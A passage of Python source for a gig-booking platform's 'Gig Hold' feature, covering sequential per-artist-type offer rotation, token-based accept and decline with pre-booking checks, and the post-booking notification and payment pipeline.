"""Gig Hold feature — venue-initiated private offer cycle at gig creation.

Phase 1 (foundation) + Phase 2 (offers + email + scheduler advancement +
multi-slot fill-as-you-go).

Sibling to the existing post-cancellation waitlist. Shares the
gig_waitlist table via the `source` column:
  - source='cancellation' (legacy) — fires when a booked artist cancels
  - source='hold' (new) — venue picks N artists at gig creation,
    sequentially offers the gig 24h each. The same artist who accepts
    one slot can be re-offered remaining slots if the gig has more
    than one open slot.

State on gigs:
  gigs.status       stays 'open' throughout (so the normal booking flow,
                    contract flow, transaction flow apply on acceptance
                    unchanged)
  gigs.hold_status  'active'    : currently in offer cycle
                    'exhausted' : everyone declined, venue must decide
                    NULL        : not a held gig (or hold cleared)

Visibility: gigs.status='open' AND hold_status IS NULL → visible to
artist search. Active+exhausted holds hidden until venue resolves.
"""
import logging
import re
import secrets
from typing import Optional

logger = logging.getLogger("gigsfill.gig_hold")


# ──────────────────────────────────────────────────────────────────────
# Public API used by routes/gigs.py:create_gig + the scheduler
# ──────────────────────────────────────────────────────────────────────


def create_hold_waitlist(db, gig_id: int, artist_ids: list, send_email_now: bool,
                         offer_window_hours: int = 24, defer_kickoff: bool = False):
    """Called from create_gig after the gig row + slot rows are inserted.

    artist_ids: ordered list of preferred-artist ids (length 1 = single-
                artist hold; length N = waitlist). Position 0 = first offer.
    send_email_now: True → send the first offer email immediately.
                    False → start the offer rotation IN-APP only (token,
                    expiration, "on the clock" status all set) but skip
                    the initial SMTP email. The 12h reminder + eventual
                    expiry still run via the scheduler; the artist sees
                    the offer in their Pending Offers banner + gig modal
                    Pending Offer panel.
                    BEFORE Jun 2026 this branch left every row at
                    offer_sent=0 / no token — so all artists showed as
                    "Queued" forever and the banner/modal couldn't find
                    the current offer holder.
    offer_window_hours: default 24.
    """
    from sqlalchemy import text
    if not artist_ids:
        return
    db.execute(
        text("""UPDATE gigs SET hold_status = 'active',
                                hold_offer_window_hours = :hrs,
                                hold_email_artists = :em,
                                hold_created_at = CURRENT_TIMESTAMP
                WHERE id = :gid"""),
        {"gid": gig_id, "hrs": int(offer_window_hours), "em": 1 if send_email_now else 0},
    )
    # Freq-policy waiver for the hold (Jun 2026 — Hold-Gig add-artist UX).
    # If the venue picked ANY artist who is currently under the venue's
    # frequency policy at this gig date, set `gigs.frequency_exempt = 1`
    # so the accept-side pre-book gate doesn't reject them when their
    # offer fires. The venue picker shows a chip + summary note so this
    # behavior is explicit, not hidden. Idempotent — running on a gig
    # already exempt is a no-op.
    #
    # Series mode (Jul 2026 — Phase 5): SKIP the auto-exempt write. In
    # series mode the artist sees a bundled-offer modal that greys out
    # dates within the venue's frequency window per their picks.
    # Auto-exempting the gig would defeat the frequency rule across
    # the whole series — not what the venue wants when they've ticked
    # both Hold AND Recurring. Series mode = freq still applies per
    # the artist's final pick. Per-instance waitlist rows still get
    # inserted below; the only thing skipped is the gigs.frequency_exempt
    # = 1 write.
    _skip_freq_exempt = bool(defer_kickoff)
    try:
        _gig_row = db.execute(
            text("""SELECT g.date, g.venue_id, COALESCE(g.frequency_exempt, 0) as fx
                    FROM gigs g WHERE g.id = :gid"""),
            {"gid": gig_id}
        ).mappings().first()
        if _gig_row and not int(_gig_row["fx"] or 0):
            _gid_str = str(_gig_row["date"])[:10]
            _venue_id = _gig_row["venue_id"]
            _venue_default = db.execute(
                text("SELECT artist_frequency_days FROM venues WHERE id = :vid"),
                {"vid": _venue_id}
            ).scalar() or 0
            _any_under = False
            for _aid in artist_ids:
                _row = db.execute(
                    text("""SELECT COALESCE(pa.frequency_days_override, v.artist_frequency_days) as freq_days
                            FROM preferred_artists pa
                            JOIN venues v ON v.id = pa.venue_id
                            WHERE pa.venue_id = :vid AND pa.artist_id = :aid"""),
                    {"vid": _venue_id, "aid": int(_aid)}
                ).mappings().first()
                _fd = (_row["freq_days"] if _row else _venue_default) or 0
                if int(_fd) <= 0:
                    continue
                # Jul 2026 refactor: dropped `g.artist_id = :aid` OR-leg.
                # Slot-only covers both shapes post-backfill.
                _booked = db.execute(text("""
                    SELECT g.date FROM gigs g
                    JOIN gig_slots gs ON gs.gig_id = g.id AND gs.artist_id = :aid
                    WHERE g.venue_id = :vid
                      AND g.id != :gid
                      AND gs.status IN ('booked','pending_contract','awaiting_venue_contract','pending_venue_approval')
                    ORDER BY ABS(julianday(g.date) - julianday(:date)) ASC
                    LIMIT 1
                """), {"vid": _venue_id, "gid": gig_id, "aid": int(_aid),
                       "date": _gid_str}).mappings().first()
                if not _booked:
                    continue
                from datetime import datetime as _dt
                _d1 = _dt.strptime(_gid_str, "%Y-%m-%d").date()
                _d2 = _dt.strptime(str(_booked["date"])[:10], "%Y-%m-%d").date()
                if abs((_d1 - _d2).days) <= int(_fd):
                    _any_under = True
                    break
            if _any_under and not _skip_freq_exempt:
                db.execute(
                    text("UPDATE gigs SET frequency_exempt = 1 WHERE id = :gid"),
                    {"gid": gig_id}
                )
                logger.info(f"[HOLD] gig={gig_id} frequency_exempt=1 set (hold list contains under-freq artist)")
    except Exception as _fxe:
        logger.warning(f"[HOLD] freq-exempt check failed for gig={gig_id}: {_fxe}")

    for i, aid in enumerate(artist_ids):
        try:
            db.execute(
                text("""INSERT INTO gig_waitlist
                          (gig_id, artist_id, source, position, notified)
                        VALUES (:gid, :aid, 'hold', :pos, 0)"""),
                {"gid": gig_id, "aid": int(aid), "pos": i},
            )
        except Exception as e:
            logger.warning(f"[HOLD] skipped duplicate artist={aid} on gig={gig_id}: {e}")
    db.commit()
    # Series mode: don't fire per-gig rotation — the series-start
    # endpoint will fire ONE bundled offer per artist across the whole
    # series (Jul 2026). Waitlist rows are staged and hold_status is
    # 'active', so the gig is hidden from public search while waiting.
    if defer_kickoff:
        return
    # Always advance to put the first artist "on the clock" — the
    # email-or-not toggle only gates the email send, not the rotation
    # state machine. send_email=False still sets offer_sent, token,
    # and expiration so the banner/modal Pending Offer surfaces work.
    send_next_hold_offer(db, gig_id, send_email=bool(send_email_now))


def send_next_hold_offer(db, gig_id: int, send_email: Optional[bool] = None) -> list:
    """Parallel-per-type hold rotation (Jun 2026 — Option A).

    A gig with N distinct open slot artist_types runs N independent
    rotations. Each rotation's "next" is the lowest-position waitlist
    artist whose artist_type matches the bucket — and we fire offers
    for every bucket that has no in-flight offer yet. So a gig with
    {Live Band, DJ} slots and a queue [LB1, LB2, LB3, DJ1] fires LB1
    and DJ1 immediately at hold start. LB2 and LB3 wait until LB1
    responds; DJ1 doesn't sit behind the Live Band queue.

    The venue's position order is still respected WITHIN each bucket.
    Across buckets, parallelism wins: the lowest-position artist of
    each open-slot type is offered without waiting for the others.

    Up to 4 buckets in practice (the platform's artist_types: Live
    Band, DJ, Comedian, Trivia Host).

    send_email (Jun 2026):
      - None (default): use the gig's stored `hold_email_artists`
        preference (set at create-time). Downstream advances respect
        the venue's original choice without re-threading the flag.
      - True/False: explicit override.

    Returns the list of artist_ids offered THIS call. Empty list when
    every bucket is either in-flight or has no remaining candidates;
    if NOTHING is active across all buckets, marks hold exhausted
    and fires the venue email.
    """
    from sqlalchemy import text
    # Open slot types still needing an artist. DISTINCT keeps two
    # Live Band slots from running two parallel LB rotations — one
    # bucket per artist_type. The matching artist sees ALL their
    # matching open slots in the offer email and picks one.
    open_type_rows = db.execute(
        text("""SELECT DISTINCT artist_type FROM gig_slots
                WHERE gig_id = :gid AND status = 'open' AND artist_type IS NOT NULL"""),
        {"gid": gig_id}
    ).mappings().all()
    if not open_type_rows:
        # No open slots left → hold is fully booked. Treat as exhausted
        # so the venue gets the wrap-up notification path.
        _mark_exhausted_and_notify(db, gig_id)
        return []
    gig_pref = db.execute(
        text("""SELECT COALESCE(hold_offer_window_hours, 24) as win,
                       COALESCE(hold_email_artists, 1) as email_on
                FROM gigs WHERE id = :gid"""),
        {"gid": gig_id},
    ).mappings().first()
    win = gig_pref["win"] if gig_pref else 24
    if send_email is None:
        send_email = bool(int(gig_pref["email_on"] or 0)) if gig_pref else True

    offered_ids: list = []
    any_active = False  # any bucket has live in-flight OR brand-new offer

    for ot in open_type_rows:
        artist_type = ot["artist_type"]
        # In-flight check per bucket: is there already an unresolved
        # offer to an artist of this type? If yes, don't double-offer —
        # let the existing offer run out / get a response first.
        in_flight = db.execute(
            text("""SELECT wl.id FROM gig_waitlist wl
                    JOIN artists a ON a.id = wl.artist_id
                    WHERE wl.gig_id = :gid AND wl.source = 'hold'
                      AND wl.offer_sent = 1 AND wl.offer_declined = 0
                      AND a.artist_type = :t
                    LIMIT 1"""),
            {"gid": gig_id, "t": artist_type}
        ).first()
        if in_flight:
            any_active = True
            continue
        # Next unmoved artist matching this type, lowest position wins.
        row = db.execute(
            text("""SELECT wl.id, wl.artist_id, wl.position FROM gig_waitlist wl
                    JOIN artists a ON a.id = wl.artist_id
                    WHERE wl.gig_id = :gid AND wl.source = 'hold'
                      AND wl.offer_sent = 0 AND wl.offer_declined = 0
                      AND a.artist_type = :t
                    ORDER BY wl.position ASC LIMIT 1"""),
            {"gid": gig_id, "t": artist_type}
        ).mappings().first()
        if not row:
            # No candidates left for this slot type — bucket is dead
            # but other buckets may still fire.
            continue
        token = secrets.token_urlsafe(24)
        # Python-computed expires_at (#20 audit fix: cross-engine; the
        # SQLite-only datetime('now','+X hours') would fail on Postgres
        # prod since the compat shim doesn't translate functions).
        from datetime import datetime as _dt, timedelta as _td
        _expires_at = (_dt.utcnow() + _td(hours=int(win or 24))).strftime("%Y-%m-%d %H:%M:%S")
        db.execute(
            text("""UPDATE gig_waitlist
                    SET offer_sent = 1,
                        offer_sent_at = CURRENT_TIMESTAMP,
                        offer_expires_at = :exp,
                        offer_token = :tok,
                        notified = 1,
                        notified_at = CURRENT_TIMESTAMP
                    WHERE id = :id"""),
            {"id": row["id"], "tok": token, "exp": _expires_at},
        )
        db.commit()
        aid = int(row["artist_id"])
        offered_ids.append(aid)
        any_active = True
        logger.info(
            f"[HOLD] gig={gig_id} offered to artist={aid} bucket={artist_type!r} "
            f"(position={row['position']}, token={token[:8]}..., "
            f"email={'on' if send_email else 'off'})"
        )
        if send_email:
            # _send_hold_offer_email may auto-decline + re-call
            # send_next_hold_offer if THIS artist has no matching slot
            # (band_formats/styles mismatch within the same artist_type).
            # That recursion is fine: it advances only that bucket.
            _send_hold_offer_email(db, gig_id=gig_id, artist_id=aid, token=token, is_reminder=False)

    if not any_active:
        _mark_exhausted_and_notify(db, gig_id)
    return offered_ids


def respond_to_hold_offer(db, token: str, action: str, slot_id: Optional[int] = None):
    """Token-based accept/decline endpoint handler. Called by
    routes/gigs.py:respond_hold (added in this phase).

    action='accept' + slot_id: book the specified slot for this artist.
                                If the gig has more open slots after,
                                advance to the next artist on the waitlist
                                (same artist isn't re-offered).
    action='decline':           mark the offer declined, advance to
                                next artist.

    Returns a dict with `ok` + a human-readable `message` + (on accept)
    the booked slot_id. Idempotent: a token that's been used returns
    a friendly "already responded" message instead of erroring.
    """
    from sqlalchemy import text
    row = db.execute(
        text("""SELECT wl.id as wl_id, wl.gig_id, wl.artist_id, wl.offer_expires_at,
                       wl.offer_declined, wl.notified_at,
                       g.hold_status, g.status as gig_status, g.is_multi_slot,
                       g.venue_id
                FROM gig_waitlist wl
                JOIN gigs g ON g.id = wl.gig_id
                WHERE wl.offer_token = :tok AND wl.source = 'hold'
                LIMIT 1"""),
        {"tok": token}
    ).mappings().first()
    if not row:
        return {"ok": False, "message": "This offer link isn't valid. It may have been replaced by a newer offer."}
    if row["offer_declined"]:
        return {"ok": False, "message": "You already responded to this offer."}
    # Token expired?
    from datetime import datetime as _dt
    if row["offer_expires_at"]:
        exp_str = str(row["offer_expires_at"]).replace("T", " ").split(".")[0]
        try:
            exp_dt = _dt.strptime(exp_str, "%Y-%m-%d %H:%M:%S")
            if _dt.utcnow() > exp_dt:
                return {"ok": False, "message": "This offer has expired. The gig has been offered to the next artist."}
        except Exception:
            pass
    if row["hold_status"] != "active":
        return {"ok": False, "message": "This hold is no longer active."}

    if action == "decline":
        db.execute(
            text("""UPDATE gig_waitlist SET offer_declined = 1,
                                            offer_expires_at = CURRENT_TIMESTAMP
                    WHERE id = :wlid"""),
            {"wlid": row["wl_id"]}
        )
        db.commit()
        logger.info(f"[HOLD] gig={row['gig_id']} artist={row['artist_id']} declined")
        _notify_venue_decline(db, gig_id=row["gig_id"], artist_id=row["artist_id"],
                              reason="declined")
        send_next_hold_offer(db, row["gig_id"])
        return {"ok": True, "message": "Thanks — we've let the venue know."}

    if action == "accept":
        # Multi-slot gigs with mixed types: filter to only slots this
        # specific artist can actually fill. A DJ artist offered a gig
        # with a Live Band slot + a DJ slot only sees the DJ slot.
        open_slots = _list_matching_open_slots(db, row["gig_id"], row["artist_id"])
        if not open_slots:
            # Either no open slots at all OR none match this artist's
            # type. Both are dead-ends for this offer.
            any_open = _list_open_hold_slots(db, row["gig_id"])
            if not any_open:
                return {"ok": False, "message": "All slots on this gig have already been booked."}
            return {"ok": False, "message": "None of the open slots match your artist type."}
        chosen = None
        if slot_id:
            for s in open_slots:
                if int(s["id"]) == int(slot_id):
                    chosen = s
                    break
            if chosen is None:
                return {"ok": False, "message": "That slot is no longer available for your type — pick a different one."}
        elif len(open_slots) == 1:
            chosen = open_slots[0]
        else:
            return {"ok": False, "message": "This gig has more than one open slot — pick which one you want."}

        # ── Pre-book gates ─────────────────────────────────────────────
        # Mirror the gates book_slot runs before claiming the slot.
        # Skipping these means a hold-accepted artist could be booked
        # into a conflicting time, exceed the venue's frequency policy,
        # or land a booking they can't get paid for (Stripe Connect not
        # onboarded → transaction creation silently fails downstream).
        # Each gate raises a clear HTTPException-style result so the
        # accept landing page surfaces a useful message instead of just
        # 'something went wrong'.
        gig_for_checks = db.execute(
            text("SELECT venue_id, date, COALESCE(frequency_exempt,0) as frequency_exempt FROM gigs WHERE id = :gid"),
            {"gid": row["gig_id"]}
        ).mappings().first()
        gate_venue_id = gig_for_checks["venue_id"] if gig_for_checks else None
        gate_gig_date = gig_for_checks["date"] if gig_for_checks else None
        # Venue-set frequency-exempt waiver (set when a venue intentionally
        # adds an under-freq artist via Hold-Gig picker, mirroring book_gig
        # at routes/gigs.py:2407). Without this the auto-waiver is silently
        # ineffective: the artist accepts the offer and the freq gate below
        # 403s them anyway.
        gate_freq_exempt = bool((gig_for_checks or {}).get("frequency_exempt"))

        # 1. Time-overlap check — same helper book_slot uses.
        try:
            from backend.routes.gigs import _enforce_no_artist_time_overlap
            _enforce_no_artist_time_overlap(
                db, row["artist_id"], row["gig_id"], gate_venue_id,
                gate_gig_date, chosen.get("start_time"), chosen.get("end_time")
            )
        except Exception as _ovc:
            # _enforce_no_artist_time_overlap raises HTTPException(403)
            # on conflict; surface the message back to the artist.
            msg = getattr(_ovc, "detail", None) or str(_ovc) or "This slot overlaps another booking you already have."
            db.commit()
            return {"ok": False, "message": msg}

        # 2. Venue frequency-days policy. Mirrors book_slot:4577-4606
        # (same query shape, same waiver semantics). When the venue
        # explicitly added an under-freq artist via Hold-Gig picker,
        # `gigs.frequency_exempt=1` is stamped at queue-build time;
        # the venue's choice waives this gate.
        if gate_gig_date and not gate_freq_exempt:
            try:
                _gd_str = str(gate_gig_date)[:10]
                _freq_row = db.execute(
                    text("""SELECT COALESCE(pa.frequency_days_override, v.artist_frequency_days) as freq_days
                            FROM preferred_artists pa
                            JOIN venues v ON v.id = pa.venue_id
                            WHERE pa.venue_id = :vid AND pa.artist_id = :aid"""),
                    {"vid": gate_venue_id, "aid": row["artist_id"]}
                ).mappings().first()
                if not _freq_row:
                    _vf = db.execute(
                        text("SELECT artist_frequency_days FROM venues WHERE id = :vid"),
                        {"vid": gate_venue_id}
                    ).mappings().first()
                    _freq_row = {"freq_days": (_vf or {}).get("artist_frequency_days")}
                _freq_days = _freq_row.get("freq_days") or 0
                if _freq_days > 0:
                    # Jul 2026 refactor: dropped `g.artist_id = :aid` OR-leg.
                    _close = db.execute(
                        text("""SELECT g.date FROM gigs g
                                JOIN gig_slots gs ON gs.gig_id = g.id AND gs.artist_id = :aid
                                WHERE g.venue_id = :vid AND g.id != :gid
                                  AND g.status IN ('booked','pending_contract','awaiting_venue_contract','pending_venue_approval')
                                  AND gs.status IN ('booked','pending_contract','awaiting_venue_contract','pending_venue_approval')
                                ORDER BY ABS(JULIANDAY(g.date) - JULIANDAY(:d)) LIMIT 1"""),
                        {"vid": gate_venue_id, "aid": row["artist_id"], "gid": row["gig_id"], "d": _gd_str}
                    ).mappings().first()
                    if _close:
                        from datetime import datetime as _dt_freq
                        _d1 = _dt_freq.strptime(_gd_str, "%Y-%m-%d")
                        _d2 = _dt_freq.strptime(str(_close["date"])[:10], "%Y-%m-%d")
                        _apart = abs((_d1 - _d2).days)
                        if _apart <= _freq_days:
                            db.commit()
                            # Mirror book_slot's error message — includes
                            # both direction (before/after) and the gap
                            # the venue actually needs.
                            _needed = _freq_days + 1 - _apart
                            _dir = "before" if _d2 > _d1 else "after"
                            return {"ok": False, "message":
                                f"This venue requires more than {_freq_days} days between performances. "
                                f"You have a gig {_dir} this one on {_d2.strftime('%b %d, %Y')}. "
                                f"Gigs must be at least {_needed} more day{'s' if _needed != 1 else ''} apart."}
            except Exception as _fe:
                logger.warning(f"[HOLD] frequency check failed for gig={row['gig_id']}: {_fe}")

        # 3. Stripe Connect onboarding gate. Same check book_slot runs
        # — without an onboarded payout account the booking lands but
        # _create_booking_transaction silently fails downstream and
        # the artist never gets paid. Better to block at the front door.
        # Test Mode removed (Jul 1 2026): hard-blocks unconditionally now.
        try:
            _eps = db.execute(
                text("""SELECT COALESCE(stripe_connect_onboarding_complete, 0) as ok
                        FROM entity_payment_settings
                        WHERE entity_type = 'artist' AND entity_id = :aid"""),
                {"aid": row["artist_id"]}
            ).mappings().first()
            if not _eps or not int(_eps["ok"] or 0):
                db.commit()
                return {"ok": False, "message":
                    "Your payout account isn't set up yet. Connect your Stripe account in your artist Payments tab, then come back and accept."}
        except Exception as _se:
            logger.warning(f"[HOLD] stripe gate check failed for gig={row['gig_id']}: {_se}")

        # Missing pre-book gates (Jul 1 2026 audit RED fix). The legacy
        # per-gig hold accept path relied on the venue only having
        # invited artists they'd already vetted, but that trust broke
        # once venues could seed queues from any artist source. Mirror
        # the same ban / W-9 / blackout / per-gig-dedupe checks that
        # book_slot and _book_one_series_pick already run. Cross-venue
        # time-overlap is already checked above (gate #1) and Stripe
        # Connect is checked immediately above.
        try:
            # Ban
            if db.execute(
                text("SELECT 1 FROM venue_artist_bans WHERE venue_id=:vid AND artist_id=:aid"),
                {"vid": gate_venue_id, "aid": row["artist_id"]}
            ).first():
                db.commit()
                return {"ok": False, "message":
                    "You are not permitted to book at this venue."}
            # W-9 if the venue requires one this calendar year
            _w9 = db.execute(
                text("SELECT require_w9 FROM venue_tax_settings WHERE venue_id = :vid"),
                {"vid": gate_venue_id}
            ).first()
            if _w9 and _w9[0]:
                from backend.utils import get_venue_timezone as _gvt
                _cy = _dt.now(_gvt(db, gate_venue_id)).year
                _w9r = db.execute(
                    text("SELECT tax_year FROM w9_forms WHERE entity_type='artist' AND entity_id=:aid ORDER BY tax_year DESC LIMIT 1"),
                    {"aid": row["artist_id"]}
                ).first()
                if not _w9r or _w9r[0] < _cy:
                    db.commit()
                    return {"ok": False, "message":
                        "This venue requires an up-to-date W-9 on file before booking."}
            # Artist blackout
            _bo = db.execute(
                text("""SELECT reason FROM artist_availability
                        WHERE artist_id = :aid
                          AND date(:d) BETWEEN date(blackout_start) AND date(blackout_end)
                        LIMIT 1"""),
                {"aid": row["artist_id"], "d": str(gate_gig_date)[:10] if gate_gig_date else ""}
            ).first()
            if _bo:
                db.commit()
                return {"ok": False, "message":
                    f"You have a blackout on this date: {_bo[0] or 'unavailable'}"}
            # Per-gig dedupe — one slot per artist per gig. Book_slot
            # (routes/gigs.py:4803) enforces this; hold-accept was
            # silently letting a second slot land.
            _dupe = db.execute(
                text("""SELECT id FROM gig_slots
                        WHERE gig_id = :gid AND artist_id = :aid AND id != :sid
                          AND status IN ('booked','pending_venue_approval','pending_contract','awaiting_venue_contract')"""),
                {"gid": row["gig_id"], "aid": row["artist_id"], "sid": chosen["id"]}
            ).first()
            if _dupe:
                db.commit()
                return {"ok": False, "message":
                    "You already have another slot on this gig — one slot per artist per gig."}
        except Exception as _ge:
            _msg = getattr(_ge, "detail", None) or str(_ge)
            logger.warning(f"[HOLD] pre-book gate raised for gig={row['gig_id']}: {_msg}")
            db.commit()
            return {"ok": False, "message": _msg or "Booking blocked — please try again."}

        # Apply pay override BEFORE booking. Rule (Jun 2026):
        #   - Flat slot → bump slot.pay to override if higher (always).
        #   - Door slot → bump guarantee_cents AND mirror into slot.pay
        #                 ONLY when slot.apply_override = 1 (default 0).
        # The flag is the venue's per-slot opt-in on the door config UI.
        _is_door = (chosen.get("deal_type") or "flat").lower() == "door"
        _door_opted_in = _is_door and int(chosen.get("apply_override") or 0) == 1
        if (not _is_door) or _door_opted_in:
            _ov = db.execute(
                text("""SELECT pay_dollars_override, pay_cents_override
                        FROM preferred_artists
                        WHERE venue_id = (SELECT venue_id FROM gigs WHERE id = :gid)
                          AND artist_id = :aid AND status = 'approved'"""),
                {"gid": row["gig_id"], "aid": row["artist_id"]}
            ).mappings().first()
            if _ov and _ov.get("pay_dollars_override") is not None:
                _override_pay = float(_ov["pay_dollars_override"]) + float(_ov.get("pay_cents_override") or 0) / 100
                if _is_door:
                    _current_gua = float(chosen.get("guarantee_cents") or 0) / 100.0
                    if _override_pay > _current_gua:
                        _new_gua_cents = int(round(_override_pay * 100))
                        db.execute(
                            text("UPDATE gig_slots SET guarantee_cents = :gc, pay = :pay WHERE id = :sid"),
                            {"gc": _new_gua_cents, "pay": _override_pay, "sid": chosen["id"]}
                        )
                        chosen = dict(chosen)
                        chosen["guarantee_cents"] = _new_gua_cents
                        chosen["pay"] = _override_pay
                else:
                    _current_pay = float(chosen.get("pay") or 0)
                    if _override_pay > _current_pay:
                        db.execute(
                            text("UPDATE gig_slots SET pay = :pay WHERE id = :sid"),
                            {"pay": _override_pay, "sid": chosen["id"]}
                        )
                        chosen = dict(chosen)
                        chosen["pay"] = _override_pay

        # Book the slot atomically. status='open' guard prevents another
        # accept from double-claiming the slot; the NOT EXISTS clause
        # prevents a parallel-tab race where the SAME artist could claim
        # two slots on the same gig before the Python-side dedupe check
        # above committed. Both rowcount=0 outcomes map to a user-facing
        # "someone else grabbed it" / "you already have this" message.
        result = db.execute(
            text("""UPDATE gig_slots SET artist_id = :aid, status = 'booked'
                    WHERE id = :sid AND status = 'open'
                      AND NOT EXISTS (
                          SELECT 1 FROM gig_slots gs2
                          WHERE gs2.gig_id = :gid AND gs2.artist_id = :aid
                            AND gs2.id != :sid
                            AND gs2.status IN ('booked','pending_venue_approval','pending_contract','awaiting_venue_contract')
                      )"""),
            {"aid": row["artist_id"], "sid": chosen["id"], "gid": row["gig_id"]}
        )
        if result.rowcount == 0:
            db.commit()
            # Distinguish: did the slot get taken, or did this artist
            # already have another slot? Re-query to give an accurate
            # user-facing message.
            _still_open = db.execute(
                text("SELECT status FROM gig_slots WHERE id = :sid"),
                {"sid": chosen["id"]}
            ).scalar()
            if _still_open == 'open':
                return {"ok": False, "message":
                    "You already have another slot on this gig — one slot per artist per gig."}
            return {"ok": False, "message": "Someone else grabbed that slot first. Try a different one."}
        # Mark this waitlist row as no longer in flight (offer consumed)
        db.execute(
            text("""UPDATE gig_waitlist SET offer_declined = 1,
                                            offer_expires_at = CURRENT_TIMESTAMP
                    WHERE id = :wlid"""),
            {"wlid": row["wl_id"]}
        )

        # Are there still open slots? If yes, hold stays active and we
        # advance to the next artist (excluding the one who just
        # booked — they could come back via the standard search if
        # they want another slot, but the hold rotation moves on).
        # If no open slots: gig is fully booked; promote gigs.status =
        # 'booked' and clear hold_status.
        # Clear ancillary state on the parent gig so a held gig that
        # had previous radius-blast / cancellation history doesn't
        # leak that into the booking. Mirrors book_slot's behaviour.
        db.execute(
            text("""UPDATE gigs
                    SET radius_blast_token = NULL,
                        last_cancelled_artist_id = NULL
                    WHERE id = :gid"""),
            {"gid": row["gig_id"]}
        )

        more_open = db.execute(
            text("SELECT COUNT(*) FROM gig_slots WHERE gig_id = :gid AND status = 'open'"),
            {"gid": row["gig_id"]}
        ).scalar()
        if more_open and more_open > 0:
            db.commit()
            logger.info(f"[HOLD] gig={row['gig_id']} artist={row['artist_id']} accepted slot={chosen['id']}; {more_open} slot(s) still open — advancing waitlist")
            _run_hold_post_book_pipeline(db, gig_id=row["gig_id"], artist_id=row["artist_id"],
                                          slot_id=int(chosen["id"]), slot=chosen,
                                          remaining_open=int(more_open))
            send_next_hold_offer(db, row["gig_id"])
            return {"ok": True, "message": "Booked! We've notified the venue.", "slot_id": int(chosen["id"])}
        else:
            db.execute(
                text("UPDATE gigs SET status = 'booked', hold_status = NULL WHERE id = :gid"),
                {"gid": row["gig_id"]}
            )
            db.commit()
            logger.info(f"[HOLD] gig={row['gig_id']} artist={row['artist_id']} accepted final slot={chosen['id']} — gig fully booked")
            _run_hold_post_book_pipeline(db, gig_id=row["gig_id"], artist_id=row["artist_id"],
                                          slot_id=int(chosen["id"]), slot=chosen,
                                          remaining_open=0)
            return {"ok": True, "message": "Booked! We've notified the venue.", "slot_id": int(chosen["id"])}

    return {"ok": False, "message": "Unknown action."}


def _run_hold_post_book_pipeline(db, gig_id: int, artist_id: int,
                                  slot_id: int, slot, remaining_open: int):
    """Run the full post-book pipeline after a Hold-offer acceptance.
    This mirrors the tail-end of book_slot in routes/gigs.py and was
    previously missing — hold acceptance left the slot booked but did
    NOT send the artist booking confirmation, did NOT create the
    transaction row for payment, did NOT fire the in-app booking
    notifications, and did NOT remove the artist from any standing
    waitlists. Result: a held gig accepted by an artist looked
    half-confirmed compared to the same gig accepted via the regular
    Book flow.

    Sequencing follows book_slot:
      1. Clear cancellation-waitlist rows (the artist booked the gig,
         not a waitlist offer).
      2. In-app notifications via notify_gig_booked (fans out across
         multi-user artist/venue entity_users).
      3. Venue email + in-app via _notify_venue_accept (hold-specific
         template that mentions the waitlist position).
      4. Booking confirmation emails via send_booking_emails (the
         standard artist + venue confirmation).
      5. Transaction row via _create_booking_transaction (the payment
         pipeline reads this to charge the venue's saved card and
         schedule the artist payout).

    Each step is try/except so a downstream failure doesn't undo
    earlier work — same defensive pattern as book_slot's tail. Logs
    loudly on failure so admin can spot + recover.
    """
    from sqlalchemy import text
    # Clear cancellation-waitlist + offer rows + activity-center notif
    try:
        db.execute(
            text("""DELETE FROM gig_waitlist
                    WHERE gig_id = :gid AND artist_id = :aid
                      AND (source IS NULL OR source = 'cancellation')"""),
            {"gid": gig_id, "aid": artist_id}
        )
        db.execute(
            text("DELETE FROM waitlist_offered WHERE gig_id = :gid AND artist_id = :aid"),
            {"gid": gig_id, "aid": artist_id}
        )
        try:
            from backend.routes.waitlist import _clear_waitlist_offer_notification as _cwon
            _cwon(db, gig_id, artist_id)
        except Exception:
            pass
        db.commit()
    except Exception as e:
        logger.warning(f"[HOLD] waitlist cleanup on accept failed for gig={gig_id} artist={artist_id}: {e}")

    # Hydrate gig details for notify + emails (same shape book_slot uses)
    try:
        gd = db.execute(
            text("""SELECT g.date, g.title, g.artist_type, g.band_formats, g.styles,
                           v.venue_name, v.user_id as venue_user_id,
                           a.name as artist_name, a.user_id as artist_user_id,
                           g.venue_id
                    FROM gigs g
                    JOIN venues v ON g.venue_id = v.id
                    JOIN artists a ON a.id = :aid
                    WHERE g.id = :gid"""),
            {"gid": gig_id, "aid": artist_id}
        ).mappings().first()
    except Exception as e:
        logger.error(f"[HOLD] post-book pipeline hydrate failed gig={gig_id}: {e}")
        gd = None

    # In-app booking notification (multi-user aware)
    if gd:
        try:
            from backend.services.notification_service import notify_gig_booked
            _gd = dict(gd)
            _gd["start_time"] = slot.get("start_time") if slot else None
            notify_gig_booked(db, _gd, gig_id, gd["venue_id"], artist_id)
            db.commit()
        except Exception as e:
            logger.error(f"[HOLD] notify_gig_booked failed gig={gig_id}: {e}")

    # Venue-side hold-acceptance notification (existing helper)
    try:
        _notify_venue_accept(db, gig_id=gig_id, artist_id=artist_id,
                             slot=slot, remaining_open=remaining_open)
    except Exception as e:
        logger.error(f"[HOLD] _notify_venue_accept failed gig={gig_id}: {e}")

    # Booking confirmation emails (artist + venue) — same template the
    # normal book_slot path uses, so the artist gets the same nicely-
    # formatted Booked! email regardless of whether they came in via
    # the direct-book button or the hold-offer flow.
    try:
        from backend.services.email_dispatch import send_booking_emails
        send_booking_emails(db, gig_id, slot_id=slot_id)
    except Exception as e:
        logger.error(f"[HOLD] send_booking_emails failed gig={gig_id} slot={slot_id}: {e}")

    # Transaction row — payment pipeline needs this to fire the venue
    # charge + schedule the artist payout. Without it the booking is
    # in the calendar but no money moves. Defensive: swallow + log so
    # the booking itself isn't reverted; admin recovers via Payments
    # console (same approach as book_slot — see TXN_MISSING log tag).
    try:
        from backend.routes.gigs import _create_booking_transaction
        slot_pay_row = db.execute(
            text("SELECT pay FROM gig_slots WHERE id = :sid"), {"sid": slot_id}
        ).mappings().first()
        gig_row = db.execute(
            text("SELECT venue_id, date FROM gigs WHERE id = :gid"), {"gid": gig_id}
        ).mappings().first()
        if gig_row:
            _create_booking_transaction(
                db, gig_id, gig_row["venue_id"], artist_id,
                (slot_pay_row or {}).get("pay") or 0,
                gig_row.get("date"), slot_id=slot_id
            )
            db.commit()
    except Exception as e:
        logger.error(
            f"[HOLD][TXN_MISSING] _create_booking_transaction FAILED gig={gig_id} "
            f"artist={artist_id} slot={slot_id}. Booking + emails already landed; "
            f"admin must create the missing transaction row manually. Error: {e}",
            exc_info=True,
        )


# ──────────────────────────────────────────────────────────────────────
# Scheduler hook — runs every 10 minutes inside _scheduler_loop
